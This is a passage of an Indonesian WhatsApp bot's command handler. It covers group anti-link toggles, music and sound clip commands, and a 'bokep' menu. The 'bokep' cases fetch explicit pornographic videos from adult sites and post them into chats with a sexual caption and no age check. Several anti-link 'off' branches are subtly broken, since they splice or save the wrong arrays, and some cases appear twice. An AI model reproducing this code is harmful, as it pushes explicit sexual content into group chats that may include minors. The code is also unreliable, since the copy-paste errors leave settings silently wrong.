reply(`_Sukses aktifkan ${command} di group ini_`)
var groupe = await Kyyhst.groupMetadata(m.chat)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
Kyyhst.sendMessage(m.chat, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nJika Anda bukan admin, jangan kirimkan link video youtube di grup ini atau Anda akan langsung ditendang!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiLinkYoutubeVid) return reply('_Sudah Dimatikan_')
let off = ntilinkytvid.indexOf(m.chat)
ntilinkytvid.splice(off, 1)
fs.writeFileSync('./system/Database/Antilink/antilinkytvideo.json', JSON.stringify(ntilinkytvid))
reply(`_Sukses matikan ${command} di group ini_`)
} else {
reply('on untuk mengaktifkan, off untuk menonaktifkan')
}
}
break

case 'antilinkyoutubech': case 'antilinkyoutubechannel': case 'antilinkytch': {
if (!m.isGroup) return reply(`Khusus Grub Geblek`)
if (!isBotAdmins) return reply('Bot Bukan Admin Geblek')
if (!isAdmins && !isCreator) return reply('Khusus Admin Sayaaaang ><')
if (args[0] === "on") {
if (AntiLinkYoutubeChannel) return reply('_Sudah Diaktifkan_')
ntilinkytch.push(m.chat)
fs.writeFileSync('./system/Database/Antilink/antilinkytchannel.json', JSON.stringify(ntilinkytch))
reply(`_Sukses aktifkan ${command} di group ini_`)
var groupe = await Kyyhst.groupMetadata(m.chat)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
Kyyhst.sendMessage(m.chat, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nJika Anda bukan admin, jangan kirimkan link channel youtube di grup ini atau Anda akan langsung ditendang!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiLinkYoutubeChannel) return reply('_Sudah Dimatikan_')
let off = ntilinkytch.indexOf(m.chat)
fs.writeFileSync('./system/Database/Antilink/antilinkytchannel.json', JSON.stringify(ntilinkytch))
ntilinkytch.splice(off, 1)
reply(`_Sukses matikan ${command} di group ini_`)
} else {
reply('on untuk mengaktifkan, off untuk menonaktifkan')
}
}
break

case 'antilinkinstagram': case 'antilinkig': case 'antilinkinsta': {
if (!m.isGroup) return reply(`Khusus Grub Geblek`)
if (!isBotAdmins) return reply('Bot Bukan Admin Geblek')
if (!isAdmins && !isCreator) return reply('Khusus Admin Sayaaaang ><')
if (args[0] === "on") {
if (AntiLinkInstagram) return reply('_Sudah Diaktifkan_')
ntilinkig.push(m.chat)
fs.writeFileSync('./system/Database/Antilink/antilinkinstagram.json', JSON.stringify(ntilinkig))
reply(`_Sukses aktifkan ${command} di group ini_`)
var groupe = await Kyyhst.groupMetadata(m.chat)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
Kyyhst.sendMessage(m.chat, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nJika Anda bukan admin, jangan kirim instagram link di grup ini atau kamu akan langsung ditendang!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiLinkInstagram) return reply('_Sudah Dimatikan_')
let off = ntilinkig.indexOf(m.chat)
ntilinkig.splice(off, 1)
fs.writeFileSync('./system/Database/Antilink/antilinkinstagram.json', JSON.stringify(ntilinkig))
reply(`_Sukses matikan ${command} di group ini_`)
} else {
reply('on untuk mengaktifkan, off untuk menonaktifkan')
}
}
break

case 'antilinkfacebook': case 'antilinkfb': {
if (!m.isGroup) return reply(`Khusus Grub Geblek`)
if (!isBotAdmins) return reply('Bot Bukan Admin Geblek')
if (!isAdmins && !isCreator) return reply('Khusus Admin Sayaaaang ><')
if (args[0] === "on") {
if (AntiLinkFacebook) return reply('_Sudah Diaktifkan_')
ntilinkfb.push(m.chat)
fs.writeFileSync('./system/Database/Antilink/antilinkfacebook.json', JSON.stringify(ntilinkfb))
reply(`_Sukses aktifkan ${command} di group ini_`)
var groupe = await Kyyhst.groupMetadata(m.chat)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
Kyyhst.sendMessage(m.chat, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nJika Anda bukan admin, jangan kirim facebook link di grup ini atau kamu akan langsung ditendang!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiLinkFacebook) return reply('_Sudah Dimatikan_')
let off = ntilinkfb.indexOf(m.chat)
ntilinkfb.splice(off, 1)
fs.writeFileSync('./system/Database/Antilink/antilinkfacebook.json', JSON.stringify(ntilinkfb))
reply(`_Sukses matikan ${command} di group ini_`)
} else {
reply('on untuk mengaktifkan, off untuk menonaktifkan')
}
}
break
case 'antilinkbokep':{
if (!m.isGroup) return reply(`Khusus Grub Geblek`)
if (!isBotAdmins) return reply('Bot Bukan Admin Geblek')
if (!isAdmins && !isCreator) return reply('Khusus Admin Sayaaaang ><')
if (args[0] === "on") {
if (AntiDewasa) return reply('_Sudah Diaktifkan_')
ntilinkdewasa.push(m.chat)
fs.writeFileSync('./system/Database/Antilink/antilinkbokep.json', JSON.stringify(ntilinkdewasa))
reply(`_Sukses aktifkan ${command} di group ini_`)
var groupe = await Kyyhst.groupMetadata(m.chat)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
Kyyhst.sendMessage(m.chat, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nJika Anda bukan admin, jangan kirim  link dewasa di grup ini atau kamu akan langsung ditendang!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiDewasa) return reply('_Sudah Dimatikan_')
let off = ntilinkfb.indexOf(m.chat)
ntilinkdewasa.splice(off, 1)
fs.writeFileSync('./system/Database/Antilink/antilinkbokep.json', JSON.stringify(ntilinkdewasa))
reply(`_Sukses matikan ${command} di group ini_`)
} else {
reply('on untuk mengaktifkan, off untuk menonaktifkan')
}
}
break
case 'antilinktelegram': case 'antilinktg': {
if (!m.isGroup) return reply(`Khusus Grub Geblek`)
if (!isBotAdmins) return reply('Bot Bukan Admin Geblek')
if (!isAdmins && !isCreator) return reply('Khusus Admin Sayaaaang ><')
if (args[0] === "on") {
if (AntiLinkTelegram) return reply('_Sudah Diaktifkan_')
ntilinktg.push(m.chat)
fs.writeFileSync('./system/Database/Antilink/antilinktelegram.json', JSON.stringify(ntilinktg))
reply(`_Sukses aktifkan ${command} di group ini_`)
var groupe = await Kyyhst.groupMetadata(m.chat)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
Kyyhst.sendMessage(m.chat, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nJika Anda bukan admin, jangan kirim telegram link di grup ini atau kamu akan langsung ditendang!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiLinkTelegram) return reply('_Sudah Dimatikan_')
let off = ntilinktg.indexOf(m.chat)
ntilinktg.splice(off, 1)
fs.writeFileSync('./system/Database/Antilink/antilinktelegram.json', JSON.stringify(ntilinktg))
reply(`_Sukses matikan ${command} di group ini_`)
} 
}
break
case 'antilinkterabox':{
if (!m.isGroup) return reply(`Khusus Grub Geblek`)
if (!isBotAdmins) return reply('Bot Bukan Admin Geblek')
if (!isAdmins && !isCreator) return reply('Khusus Admin Sayaaaang ><')
if (args[0] === "on") {
if (AntiTerabox) return reply('_Sudah Diaktifkan_')
ntilinkterabox.push(m.chat)
fs.writeFileSync('./system/Database/Antilink/antilinkterabox.json', JSON.stringify(ntilinkterabox))
reply(`_Sukses aktifkan ${command} di group ini_`)
var groupe = await Kyyhst.groupMetadata(m.chat)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
Kyyhst.sendMessage(m.chat, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nJika Anda bukan admin, jangan kirim  link Terabox di grup ini atau kamu akan langsung ditendang!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiLinkFacebook) return reply('_Sudah Dimatikan_')
let off = ntilinkterabox.indexOf(m.chat)
ntilinkfb.splice(off, 1)
fs.writeFileSync('./system/Database/Antilink/antilinkterabox.json', JSON.stringify(ntilinkterabox))
reply(`_Sukses matikan ${command} di group ini_`)
} else {
reply('on untuk mengaktifkan, off untuk menonaktifkan')
} 
}
break
case 'antilinkmediafire':{
if (!m.isGroup) return reply(`Khusus Grub Geblek`)
if (!isBotAdmins) return reply('Bot Bukan Admin Geblek')
if (!isAdmins && !isCreator) return reply('Khusus Admin Sayaaaang ><')
if (args[0] === "on") {
if (AntiMediafire) return reply('_Sudah Diaktifkan_')
ntilink.push(m.chat)
fs.writeFileSync('./system/Database/Antilink/antilinkmediafire.json', JSON.stringify(ntilinkmediafire))
reply(`_Sukses aktifkan ${command} di group ini_`)
var groupe = await Kyyhst.groupMetadata(m.chat)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
Kyyhst.sendMessage(m.chat, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nJika Anda bukan admin, jangan kirim  link Mediafire di grup ini atau kamu akan langsung ditendang!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiMediafire) return reply('_Sudah Dimatikan_')
let off = ntilinkfb.indexOf(m.chat)
ntilinkmediafire.splice(off, 1)
fs.writeFileSync('./system/Database/Antilink/antilinkmediafire.json', JSON.stringify(ntilinkmediafire))
reply(`_Sukses matikan ${command} di group ini_`)
} else {
reply('on untuk mengaktifkan, off untuk menonaktifkan')
} 
}
break
case 'antilinkfacebook':{
if (!m.isGroup) return reply(`Khusus Grub Geblek`)
if (!isBotAdmins) return reply('Bot Bukan Admin Geblek')
if (!isAdmins && !isCreator) return reply('Khusus Admin Sayaaaang ><')
if (args[0] === "on") {
if (AntiLinkFacebook) return reply('_Sudah Diaktifkan_')
ntilinkfb.push(m.chat)
fs.writeFileSync('./system/Database/Antilink/antilinkfacebook.json', JSON.stringify(ntilinkfb))
reply(`_Sukses aktifkan ${command} di group ini_`)
var groupe = await Kyyhst.groupMetadata(m.chat)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
Kyyhst.sendMessage(m.chat, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nJika Anda bukan admin, jangan kirim facebook link di grup ini atau kamu akan langsung ditendang!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiLinkFacebook) return reply('_Sudah Dimatikan_')
let off = ntilinkfb.indexOf(m.chat)
ntilinkfb.splice(off, 1)
fs.writeFileSync('./system/Database/Antilink/antilinkfacebook.json', JSON.stringify(ntilinkfb))
reply(`_Sukses matikan ${command} di group ini_`)
} else {
reply('on untuk mengaktifkan, off untuk menonaktifkan')
}
}

break
case 'antilinktelegram': case 'antilinktg': {
if (!m.isGroup) return reply(`Khusus Grub Geblek`)
if (!isBotAdmins) return reply('Bot Bukan Admin Geblek')
if (!isAdmins && !isCreator) return reply('Khusus Admin Sayaaaang ><')
if (args[0] === "on") {
if (AntiLinkTelegram) return reply('_Sudah Diaktifkan_')
ntilinktg.push(m.chat)
fs.writeFileSync('./system/Database/Antilink/antilinktelegram.json', JSON.stringify(ntilinktg))
reply(`_Sukses aktifkan ${command} di group ini_`)
var groupe = await Kyyhst.groupMetadata(m.chat)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
Kyyhst.sendMessage(m.chat, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nJika Anda bukan admin, jangan kirim telegram link di grup ini atau kamu akan langsung ditendang!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiLinkTelegram) return reply('_Sudah Dimatikan_')
let off = ntilinktg.indexOf(m.chat)
ntilinktg.splice(off, 1)
fs.writeFileSync('./system/Database/Antilink/antilinktelegram.json', JSON.stringify(ntilinktg))
reply(`_Sukses matikan ${command} di group ini_`)
} else {
reply('on untuk mengaktifkan, off untuk menonaktifkan')
}
}
break

case 'antilinktiktok': case 'antilinktt': {
if (!m.isGroup) return reply(`Khusus Grub Geblek`)
if (!isBotAdmins) return reply('Bot Bukan Admin Geblek')
if (!isAdmins && !isCreator) return reply('Khusus Admin Sayaaaang ><')
if (args[0] === "on") {
if (AntiLinkTiktok) return reply('_Sudah Diaktifkan_')
ntilinktt.push(m.chat)
fs.writeFileSync('./system/Database/Antilink/antilinktiktok.json', JSON.stringify(ntilinktt))
reply(`_Sukses aktifkan ${command} di group ini_`)
var groupe = await Kyyhst.groupMetadata(m.chat)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
Kyyhst.sendMessage(m.chat, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nJika Anda bukan admin, jangan kirim tiktok link di grup ini atau kamu akan langsung ditendang!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiLinkTiktok) return reply('_Sudah Dimatikan_')
let off = ntilinktt.indexOf(m.chat)
ntilinktt.splice(off, 1)
fs.writeFileSync('./system/Database/Antilink/antilinktiktok.json', JSON.stringify(ntilinktt))
reply(`_Sukses matikan ${command} di group ini_`)
} else {
reply('on untuk mengaktifkan, off untuk menonaktifkan')
}
}
break

case 'antilinktwt': case 'antilinktwitter': case 'antilinktwit': {
if (!m.isGroup) return reply(`Khusus Grub Geblek`)
if (!isBotAdmins) return reply('Bot Bukan Admin Geblek')
if (!isAdmins && !isCreator) return reply('Khusus Admin Sayaaaang ><')
if (args[0] === "on") {
if (AntiLinkTwitter) return reply('_Sudah Diaktifkan_')
ntilinktwt.push(m.chat)
fs.writeFileSync('./system/Database/Antilink/antilinktwitter.json', JSON.stringify(ntilinktwt))
reply(`_Sukses aktifkan ${command} di group ini_`)
var groupe = await Kyyhst.groupMetadata(m.chat)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
Kyyhst.sendMessage(m.chat, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nJika Anda bukan admin, jangan kirim twitter link di grup ini atau kamu akan langsung ditendang!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiLinkTwitter) return reply('_Sudah Dimatikan_')
let off = ntilinktwt.indexOf(m.chat)
ntilinktwt.splice(off, 1)
fs.writeFileSync('./system/Database/Antilink/antilinktwitter.json', JSON.stringify(ntilinktwt))
reply(`_Sukses matikan ${command} di group ini_`)
} else {
reply('on untuk mengaktifkan, off untuk menonaktifkan')
}
}
break

case 'antilinkall': {
if (!m.isGroup) return reply(`Khusus Grub Geblek`)
if (!isBotAdmins) return reply('Bot Bukan Admin Geblek')
if (!isAdmins && !isCreator) return reply('Khusus Admin Sayaaaang ><')
if (args[0] === "on") {
if (AntiLinkTwitter) return reply('_Sudah Diaktifkan_')
ntilinkall.push(m.chat)
fs.writeFileSync('./system/Database/Antilink/antilinkall.json', JSON.stringify(ntilinkall))
reply(`_Sukses aktifkan ${command} di group ini_`)
var groupe = await Kyyhst.groupMetadata(m.chat)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
Kyyhst.sendMessage(m.chat, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nJika Anda bukan admin, jangan kirim link apapun di grup ini atau kamu akan langsung ditendang!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiLinkAll) return reply('_Sudah Dimatikan_')
let off = ntilinkall.indexOf(m.chat)
ntilinkall.splice(off, 1)
fs.writeFileSync('./system/Database/Antilink/antilinkall.json', JSON.stringify(ntilinkall))
reply(`_Sukses matikan ${command} di group ini_`)
} else {
reply('on untuk mengaktifkan, off untuk menonaktifkan')
}
}
break
case "antiasing":{
if (!m.isGroup) return reply(`Khusus Grub Geblek`)
if (!isBotAdmins) return reply('Bot Bukan Admin Geblek')
if (!isAdmins && !isCreator) return reply('Khusus Admin Sayaaaang ><')
if (args[0] === "on") {
if (AntiAsing) return reply('_Sudah Diaktifkan_')
ntasing.push(m.chat)
fs.writeFileSync('./system/Database/Antilink/antiasing.json', JSON.stringify(ntasing))
reply(`_Sukses aktifkan ${command} di group ini_`)
} else if (args[0] === "off") {
if (!AntiAsing) return reply('_Sudah Dimatikan_')
let off = ntasing.indexOf(m.chat)
ntasing.splice(off, 1)
fs.writeFileSync('./system/Database/Antilink/antiasing.json', JSON.stringify(ntasing))
reply(`_Sukses matikan ${command} di group ini_`)
} else {
reply('on untuk mengaktifkan, off untuk menonaktifkan')
}
}
break

case 'antiwame': {
if (!m.isGroup) return reply(`Khusus Grub Geblek`)
if (!isBotAdmins) return reply('Bot Bukan Admin Geblek')
if (!isAdmins && !isCreator) return reply('Khusus Admin Sayaaaang ><')
if (args[0] === "on") {
if (AntiWame) return reply('_Sudah Diaktifkan_')
ntwame.push(m.chat)
fs.writeFileSync('./system/Database/Antilink/antiwame.json', JSON.stringify(ntwame))
reply(`_Sukses aktifkan ${command} di group ini_`)
var groupe = await Kyyhst.groupMetadata(m.chat)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
Kyyhst.sendMessage(m.chat, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nTidak ada yang boleh mengirim wa.me di grup ini, siapa yang mengirim akan langsung ditendang!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiWame) return reply('_Sudah Dimatikan_')
let off = ntwame.indexOf(m.chat)
ntwame.splice(off, 1)
fs.writeFileSync('./system/Database/Antilink/antiwame.json', JSON.stringify(ntwame))
reply(`_Sukses matikan ${command} di group ini_`)
} else {
reply('on untuk mengaktifkan, off untuk menonaktifkan')
}
}
break

			case 'antispam':{
				if (!m.isGroup) return reply(mess.OnlyGroup)
				if (!isBotAdmins) return reply(mess.OnlyGrup)
				if (!isAdmins) return reply(mess.admins)
				if (args.length < 1) return reply('on/off?')
				if (args[0] === 'on') {
					db.data.chats[m.chat].antispam = true
					reply(`${command} is enabled`)
				} else if (args[0] === 'off') {
					db.data.chats[m.chat].antispam = false
					reply(`${command} is disabled`)
				}
			}
			break;
			
case 'antipoll':
        handleFeatureToggle('antipoll', command);
        break;

    case 'antisticker':
        handleFeatureToggle('antisticker', command);
        break;

    case 'antiimage':
        handleFeatureToggle('antiimage', command);
        break;

    case 'antivideo':
        handleFeatureToggle('antivideo', command);
        break;

    case 'antibot':
        handleFeatureToggle('antibot', command);
        break;
        
    case 'antiviewonce':
        handleFeatureToggle('antiviewonce', command);
        break;


    case 'antimedia':
        handleFeatureToggle('antimedia', command);
        break;

    case 'antidocument':
        handleFeatureToggle('antidocument', command);
        break;

    case 'anticontact':
        handleFeatureToggle('anticontact', command);
        break;

    case 'antilocation':
        handleFeatureToggle('antilocation', command);
        break;

    case 'antilinkgc':
        handleFeatureToggle('antilinkgc', command);
        break;

    case 'antipromotion':
        handleFeatureToggle('antipromotion', command);
        break;

    case 'antiaudio':
        handleFeatureToggle('antiaudio', command);
        break;

    /* 
𝗕𝗔𝗧𝗔𝗦 𝗖𝗔𝗦𝗘 𝗧𝗘𝗠𝗣𝗔𝗧 𝗚𝗥𝗢𝗨𝗣 𝗠𝗘𝗡𝗨
𝗕𝗬 𝗞𝗬𝗬𝗫𝗗
𝗔𝗞𝗔𝗠𝗘 𝗔𝗜
*/




//============================================================\\
    //  𝗠 𝗨 𝗦 𝗜 𝗖     -         𝗠 𝗘 𝗡 𝗨
//============================================================\\
                case 'music1':
case 'music2':
case 'music3':
case 'music4':
case 'music5':
case 'music6':
case 'music7':
case 'music8':
case 'music9':
case 'music10':
case 'music11':
case 'music12':
case 'music13':
case 'music14':
case 'music15':
case 'music16':
case 'music17':
case 'music18':
case 'music19':
case 'music20':
case 'music21':
case 'music22':
case 'music23':
case 'music24':
case 'music25':
case 'music26':
case 'music27':
case 'music28':
case 'music29':
case 'music30':
case 'music31':
case 'music32':
case 'music33':
case 'music34':
case 'music35':
case 'music36':
case 'music37':
case 'music38':
case 'music39':
case 'music40':
case 'music41':
case 'music42':
case 'music43':
case 'music44':
case 'music45':
case 'music46':
case 'music47':
case 'music48':
case 'music49':
case 'music50':
case 'music51':
case 'music52':
case 'music53':
case 'music54':
case 'music55':
case 'music56':
case 'music57':
case 'music58':
case 'music59':
case 'music60':
case 'music61':
case 'music62':
case 'music63':
case 'music64':
case 'music65':
case 'music66':
case 'music67':
case 'music68':
case 'music69':
case 'music70':
case 'music71':
case 'music72':
case 'music73':
case 'music74':
case 'music75':
case 'music76':
case 'music77':
case 'music78':
case 'music79':
case 'music80':
case 'music81':
case 'music82':
case 'music83':
case 'music84':
case 'music85':
Kyyhst.sendMessage(from, { react: { text: "🎧", key: m.key }})
musiknyaa = await getBuffer(`https://github.com/Kyyhst-dev/database/raw/main/musikk/${command}.mp3`)
await Kyyhst.sendMessage(m.chat, { audio: musiknyaa, mimetype: 'audio/mp4', ptt: true }, { quoted: m })
break
 case "sad1":
 case "sad2":
 case "sad3":
 case "sad4":
 case "sad5":
 case "sad6":
 case "sad7":
 case "sad8":
 case "sad9":
 case "sad10":
 case "sad11":
 case "sad12":
 case "sad13":
 case "sad14":
 case "sad15":
 case "sad16":
 case "sad17":
 case "sad18":
 case "sad19":
 case "sad20":
 case "sad21":
 case "sad22":
 case "sad23":
 case "sad24":
 case "sad25":
 case "sad26":
 case "sad27":
 case "sad28":
 case "sad29":
 case "sad30":
 case "sad31":
 case "sad32":
 case "sad33":
 case "sad34":
 case "sad35":
 const moai0 = await getBuffer(
 `https://github.com/ZassTdr/Sound-Sad/raw/main/Sad-Music/${command}.mp3`
 );
 Kyyhst.sendMessage(
 m.chat,
 {
 audio: moai0,
 mimetype: "audio/mp4",
 ptt: true,
 },
 { quoted: m }
 );
 //D|ts si pler 🐎
break
 case 'sound1':
case 'sound2':
case 'sound3':
case 'sound4':
case 'sound5':
case 'sound6':
case 'sound7':
case 'sound8':
case 'sound9':
case 'sound10':
case 'sound11':
case 'sound12':
case 'sound13':
case 'sound14':
case 'sound15':
case 'sound16':
case 'sound17':
case 'sound18':
case 'sound19':
case 'sound20':
case 'sound21':
case 'sound22':
case 'sound23':
case 'sound24':
case 'sound25':
case 'sound26':
case 'sound27':
case 'sound28':
case 'sound29':
case 'sound30':
case 'sound31':
case 'sound32':
case 'sound33':
case 'sound34':
case 'sound35':
case 'sound36':
case 'sound37':
case 'sound38':
case 'sound39':
case 'sound40':
case 'sound41':
case 'sound42':
case 'sound43':
case 'sound44':
case 'sound45':
case 'sound46':
case 'sound47':
case 'sound48':
case 'sound49':
case 'sound50':
case 'sound51':
case 'sound52':
case 'sound53':
case 'sound54':
case 'sound55':
case 'sound56':
case 'sound57':
case 'sound58':
case 'sound59':
case 'sound60':
case 'sound61':
case 'sound62':
case 'sound63':
case 'sound64':
case 'sound65':
case 'sound66':
case 'sound67':
case 'sound68':
case 'sound69':
case 'sound70':
case 'sound71':
case 'sound72':
case 'sound73':
case 'sound74':
case 'sound75':
case 'sound76':
case 'sound77':
case 'sound78':
case 'sound79':
case 'sound80':
case 'sound81':
case 'sound82':
case 'sound83':
case 'sound84':
case 'sound85':
case 'sound86':
case 'sound87':
case 'sound88':
case 'sound89':
case 'sound90':
case 'sound91':
case 'sound92':
case 'sound93':
case 'sound94':
case 'sound95':
case 'sound96':
case 'sound97':
case 'Sound98':
case 'sound99':
case 'sound100':
case 'sound101':
case 'sound102':
case 'sound103':
case 'sound104':
case 'sound105':
case 'sound106':
case 'sound107':
case 'sound108':
case 'sound109':
case 'sound110':
case 'sound111':
case 'sound112':
case 'sound113':
case 'sound114':
case 'sound115':
case 'sound116':
case 'sound117':
case 'sound118':
case 'sound119':
case 'sound120':
case 'sound121':
case 'sound122':
case 'sound123':
case 'sound124':
case 'sound125':
case 'sound126':
case 'sound127':
case 'sound128':
case 'sound129':
case 'sound130':
case 'sound131':
case 'sound132':
case 'sound133':
case 'sound134':
case 'sound135':
case 'sound136':
case 'sound137':
case 'sound138':
case 'sound139':
case 'sound140':
case 'sound141':
case 'sound142':
case 'sound143':
case 'sound144':
case 'sound145':
case 'sound146':
case 'sound147':
case 'sound148':
case 'sound149':
case 'sound150':
case 'sound151':
case 'sound152':
case 'sound153':
case 'sound154':
case 'sound155':
case 'sound156':
case 'sound157':
case 'sound158':
case 'sound159':
case 'sound160':
case 'sound161':
var resttt = await getBuffer(`https://github.com/DGXeon/Tiktokmusic-API/raw/master/tiktokmusic/${command}.mp3`)
 Kyyhst.sendMessage(m.chat, { audio: resttt, mimetype: 'audio/mp4', ptt: true, 
})
//D|ts si pler 🐎
break 
    /* 
𝗕𝗔𝗧𝗔𝗦 𝗖𝗔𝗦𝗘 𝗧𝗘𝗠𝗣𝗔𝗧 𝗠𝗨𝗦𝗜𝗖 𝗠𝗘𝗡𝗨
𝗕𝗬 𝗞𝗬𝗬𝗫𝗗
𝗔𝗞𝗔𝗠𝗘 𝗔𝗜
*/




//============================================================\\
    //  𝗕 𝗢 𝗞 𝗘 𝗣   -         𝗠 𝗘 𝗡 𝗨
//============================================================\\
case 'bokep1':
if (!isCreator&&!isPrem) return reply(`OnlyPremium`)
let ntahlah1 = await getBuffer(`https://sfmcompile.club/wp-content/uploads/2022/08/Brigitte-fucked-at-the-gym.mp4`)
Kyyhst.sendMessage(from, { video: ntahlah1, mimetype: 'video/mp4', caption : `Sange Gak Sih 😋`})
.catch(console.error)
break
case 'bokep2':
if (!isCreator&&!isPrem) return reply(`OnlyPremium`)
let ntahlah2 = await getBuffer(`https://sfmcompile.club/wp-content/uploads/2023/02/Black-Widow-handcuffed-bondage-play.mp4`)
Kyyhst.sendMessage(from, { video: ntahlah2, mimetype: 'video/mp4', caption : `Sange Gak Sih 😋`})
.catch(console.error)
break
case 'bokep3':
if (!isCreator&&!isPrem) return reply(`OnlyPremium`)
let ntahlah3 = await getBuffer(`https://sfmcompile.club/wp-content/uploads/2023/02/Black-Widow-handcuffed-bondage-play.mp4`)
Kyyhst.sendMessage(from, { video: ntahlah3, mimetype: 'video/mp4', caption : `Sange Gak Sih 😋`})
.catch(console.error)
break
case 'bokep4':
if (!isCreator&&!isPrem) return reply(`OnlyPremium`)
let ntahlah4 = await getBuffer(`https://sfmcompile.club/wp-content/uploads/2023/02/2B-outdoor-reverse-cowgirl-Sound-update.mp4`)
Kyyhst.sendMessage(from, { video: ntahlah4, mimetype: 'video/mp4', caption : `Sange Gak Sih 😋`})
.catch(console.error)
break
case 'bokep5':
if (!isCreator&&!isPrem) return reply(`OnlyPremium`)
let ntahlah5 = await getBuffer(`https://sfmcompile.club/wp-content/uploads/2023/02/Nyotengu-riding-with-help.mp4`)
Kyyhst.sendMessage(from, { video: ntahlah5, mimetype: 'video/mp4', caption : `Sange Gak Sih 😋`})
.catch(console.error)
break
case 'bokep6':
if (!isCreator&&!isPrem) return reply(`OnlyPremium`)
let ntahlah6 = await getBuffer(`https://media.discordapp.net/attachments/632434742427516948/1055565623914147910/GrandLiveDinosaur.mp4`)
Kyyhst.sendMessage(from, { video: ntahlah6, mimetype: 'video/mp4', caption : `Sange Gak Sih 😋`})
.catch(console.error)
break
case 'bokep7':
if (!isCreator&&!isPrem) return reply(`OnlyPremium`)
let ntahlah7 = await getBuffer(`https://sfmcompile.club/wp-content/uploads/2023/02/Siona-taking-it-deep.mp4`)
Kyyhst.sendMessage(from, { video: ntahlah7, mimetype: 'video/mp4', caption : `Sange Gak Sih 😋`})
.catch(console.error)
break
case 'bokep8':
if (!isCreator&&!isPrem) return reply(`OnlyPremium`)
let ntahlah8 = await getBuffer(`https://sfmcompile.club/wp-content/uploads/2023/02/Callie-working-in-Hooters.mp4`)
Kyyhst.sendMessage(from, { video: ntahlah8, mimetype: 'video/mp4', caption : `Sange Gak Sih 😋`})
.catch(console.error)
break
case 'bokep9':
if (!isCreator&&!isPrem) return reply(`OnlyPremium`)
let ntahlah9 = await getBuffer(`https://sfmcompile.club/wp-content/uploads/2023/02/Harley-Quinn-in-GCPD-cell.mp4`)
Kyyhst.sendMessage(from, { video: ntahlah9, mimetype: 'video/mp4', caption : `Sange Gak Sih 😋`})
.catch(console.error)
break
case 'bokep10':
if (!isCreator&&!isPrem) return reply(`OnlyPremium`)
let ntahlah10 = await getBuffer(`https://www.pornhub.com/view_video.php?viewkey=ph62dacb17ee77a`)
Kyyhst.sendMessage(from, { video: ntahlah10, mimetype: 'video/mp4', caption : `Sange Gak Sih 😋`})
.catch(console.error)
break
case 'bokep11':
if (!isCreator&&!isPrem) return reply(`OnlyPremium`)
let ntahlah11 = await getBuffer(`https://sfmcompile.club/wp-content/uploads/2023/02/Harley-Quinn-in-GCPD-cell-With-makeup.mp4`)
Kyyhst.sendMessage(from, { video: ntahlah11, mimetype: 'video/mp4', caption : `Sange Gak Sih 😋`})
.catch(console.error)
break
case 'bokep12':
if (!isCreator&&!isPrem) return reply(`OnlyPremium`)
